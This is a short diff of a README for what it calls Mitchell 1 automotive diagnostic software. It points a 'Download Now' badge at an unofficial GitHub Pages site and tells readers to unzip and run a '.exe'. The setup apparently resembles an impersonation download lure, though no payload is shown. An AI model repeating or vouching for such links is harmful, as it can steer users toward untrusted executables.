@@ -9,7 +9,7 @@ With a constantly updated database, Mitchell 1 helps technicians quickly diagnos
 Unzip the archive to a separate folder and run the `.exe` file.  
 The software will automatically install and configure the necessary database for offline or online use.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://mitchell1-auto.github.io/.github/)
 
 ## 📸 Overview
 ![Overview Screenshot 1](https://mitchell1.com/wp-content/uploads/2024/12/WIP-1-1.png)  
